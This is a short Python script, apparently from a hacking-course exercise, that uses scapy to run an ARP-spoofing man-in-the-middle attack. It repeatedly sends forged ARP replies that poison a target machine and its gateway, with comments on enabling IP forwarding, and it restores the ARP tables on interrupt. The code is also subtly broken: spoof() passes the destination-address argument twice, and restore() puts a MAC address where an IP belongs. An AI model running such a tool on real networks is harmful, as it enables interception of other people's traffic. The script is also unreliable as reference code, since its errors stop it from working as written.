
#arp_spoofer ----> spoofing the client that you are the router
#and spoofing the router that you are the client
#echo 1 > /proc/sys/net/ipv4/ip_forward
#go to windows macine and run arp -a
import scapy.all as scapy
import time
# import sys
def get_mac(ip):
	arp_request=scapy.ARP(pdst=ip)
	broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast=broadcast/arp_request
	answered_list=scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
		target_mac=get_mac(target_ip)
		packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, pdst=spoof_ip)
		scapy.send(packet, verbose=False)
 
def restore(destination_ip, source_ip):
	destination_mac=get_mac(destination_ip)
	source_mac=get_mac(source_ip)
	packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_mac,hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)

target_ip ="10.0.2.15" #ip of the target machine
getway_ip ="10.0.2.1"
try:
	packet_sent_count=0
	while True:
		spoof(target_ip, getway_ip)
		spoof(getway_ip, target_ip)
		packet_sent_count = packet_sent_count + 2
		print("\r[+] Sent two packets: " + str(packet_sent_count), end=""),
		# sys.stdout.flush()
		time.sleep(2)

except KeyboardInterrupt:
	print("[+] Detected CTRL + C........Restoring ARP tables please wait!")
	restore(target_ip, getway_ip)
	restore(getway_ip, target_ip)